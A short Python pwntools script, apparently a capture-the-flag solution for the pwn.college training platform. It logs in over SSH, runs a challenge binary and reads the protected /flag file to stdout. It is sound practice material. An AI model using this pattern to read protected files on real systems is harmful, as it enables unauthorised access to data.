#!/usr/bin/python3

from pwn import *

s = ssh(host="dojo.pwn.college",user="hacker",keyfile="../../key")

s.process('/challenge/run')

io = s.process(['cp','/flag','/dev/stdout'])

io.interactive()
